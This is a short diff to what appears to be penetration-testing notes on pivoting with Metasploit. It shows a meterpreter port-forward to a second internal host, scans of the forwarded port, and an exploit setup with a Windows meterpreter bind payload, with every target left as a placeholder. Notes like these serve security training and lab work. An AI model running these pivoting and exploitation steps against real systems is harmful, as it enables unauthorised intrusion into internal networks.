@@ -153,14 +153,14 @@ set RHOSTS <ip2>
 ```
 meterpreter > portfwd add -l <local_port_on_kali> -p <remote_port_on_ip2> -r <ip2>
 meterpreter > portfwd list
-```
-```
+
 netstat -an | grep LISTEN
 nmap -Pn -sV -p<local_port_on_kali> localhost
 ```
 ```
 use <exploit_module>
 set RHOSTS <ip2>
+set RPORT <remote_port_on_ip2>
 set payload windows/meterpreter/bind_tcp
 ```
 - `LPORT` will be opened on `<ip2>`.
